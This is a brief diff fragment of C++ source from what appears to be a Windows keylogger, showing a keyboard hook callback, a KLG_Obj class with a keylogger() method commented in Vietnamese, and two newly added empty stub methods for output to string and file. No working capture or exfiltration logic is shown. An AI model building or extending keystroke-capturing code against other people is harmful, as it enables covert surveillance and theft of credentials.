@@ -38,6 +38,16 @@ LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+std::string KLG_Obj::toString()
+{
+	return std::string();
+}
+
+std::string KLG_Obj::toFile(std::string filename)
+{
+	return std::string();
+}
+
 std::string KLG_Obj::keylogger()
 {
 	// Thiết lập hook để bắt sự kiện phím
